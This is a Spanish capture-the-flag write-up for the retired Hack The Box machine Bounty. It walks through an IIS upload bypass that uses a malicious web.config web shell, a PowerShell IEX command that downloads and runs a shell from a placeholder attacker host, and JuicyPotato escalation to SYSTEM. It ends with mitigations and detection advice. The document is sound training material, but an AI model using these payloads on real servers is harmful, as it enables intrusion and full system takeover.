---
machine: Bounty
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, iis, web.config, upload, juicypotato]
---

# Bounty — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

IIS 7.5 sobre Windows Server 2008 R2 y un formulario de subida en `/transfer.aspx`. El filtro bloquea `.aspx` y `.asp` pero acepta `.config`, así que se sube un `web.config` que registra el motor ASP clásico para esa extensión y ejecuta código. Después, `SeImpersonatePrivilege` permite JuicyPotato y de ahí a SYSTEM.

## Reconocimiento

```bash
nmap -Pn -sC -sV -p- <IP> -oN nmap.txt
```

```text
80/tcp  open  http  Microsoft IIS httpd 7.5
```

Solo web. IIS 7.5 implica Server 2008 R2: extensiones `.asp`/`.aspx`, `web.config` y familia Potato para escalar.

## Enumeración

```bash
gobuster dir -u http://<IP>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x asp,aspx,txt,config -t 50
```

```text
/transfer.aspx   (200)
/UploadedFiles/  (301 → 403)
```

El formulario tiene una validación JavaScript (`ValidateFile`) que solo mira la extensión en cliente. El POST necesita los tokens de ASP.NET:

```python
import requests, re

s = requests.Session()
r = s.get(f"http://{ip}/transfer.aspx")
vs = re.search(r'__VIEWSTATE[^>]+value="([^"]+)"', r.text).group(1)
ev = re.search(r'__EVENTVALIDATION[^>]+value="([^"]+)"', r.text).group(1)
data = {"__VIEWSTATE": vs, "__EVENTVALIDATION": ev, "btnUpload": "Upload"}
s.post(f"http://{ip}/transfer.aspx",
       files={"FileUpload1": ("shell.aspx", open("shell.aspx", "rb"))}, data=data)
```

Probando extensiones: `jpg`, `png`, `gif` y `config` pasan; `aspx`, `asp` y `txt` no.

## Foothold

Un `web.config` puede declarar qué motor ejecuta cada extensión. Se registra `asp.dll` para `*.config`, se quitan las reglas que protegen el fichero y se añade ASP clásico al final:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*" modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions><remove fileExtension=".config" /></fileExtensions>
        <hiddenSegments><remove segment="web.config" /></hiddenSegments>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
<%
Set o = CreateObject("WScript.Shell")
Set e = o.Exec("cmd.exe /c whoami")
Response.Write(e.StdOut.ReadAll())
%>
```

```bash
curl -s http://<IP>/UploadedFiles/web.config
# bounty\merlin
```

Para una shell inversa se cambia el `Exec` por una descarga en memoria:

```powershell
powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/shell.ps1')
```

## Escalada

```powershell
whoami /priv
```

```text
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

En 2008 R2 toca JuicyPotato: crea un servidor COM falso, fuerza a un objeto del sistema a autenticarse y roba el token.

```powershell
C:\Windows\Temp\jp.exe -l 1343 -p C:\Windows\Temp\read.bat -t * `
  -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
```

`read.bat` copia la flag a `C:\Windows\Temp` y le da permisos con `icacls`, porque los ficheros creados por SYSTEM no los puede leer `merlin`:

```bat
type C:\Users\Administrator\Desktop\root.txt > C:\Windows\Temp\root.txt
icacls C:\Windows\Temp\root.txt /grant Everyone:F
```

## Evidencia

- `whoami` → `bounty\merlin`, y ejecución como SYSTEM vía JuicyPotato.
- `whoami /priv` con `SeImpersonatePrivilege`.
- Contenido de `root.txt` (redactado).

## Lecciones aprendidas

- En IIS, si `.aspx` está bloqueado, `.config` suele pasar y es ejecutable por diseño.
- Los formularios ASP.NET exigen `__VIEWSTATE` y `__EVENTVALIDATION`: sin ellos el POST se ignora.
- La validación en JavaScript no es una defensa; el filtro real era el del servidor, y también estaba incompleto.
- `SeImpersonatePrivilege` es la escalada estándar de un worker de IIS.
- Cuando la reverse shell está bloqueada, un `.bat` que copia y comparte el fichero resuelve igual.

## Mitigaciones y detección

- Bloquear la subida de `.config`, `.asp`, `.aspx` y cualquier extensión ejecutable; validar por contenido y renombrar.
- Servir las subidas desde un directorio sin permisos de ejecución (`<handlers>` restringido).
- Deshabilitar ASP clásico si no se usa y aplicar request filtering por defecto.
- Quitar `SeImpersonatePrivilege` a las identidades de aplicación cuando sea posible.
- Detección: `web.config` creado en directorios de subida, peticiones a `/UploadedFiles/*.config`, ejecución de `asp.dll`.
- MITRE: T1505.003, T1190, T1134.001.

## Referencias

- IIS `web.config` handler registration.
- JuicyPotato (CLSID de BITS).
- MITRE ATT&CK: T1505.003, T1134.001.
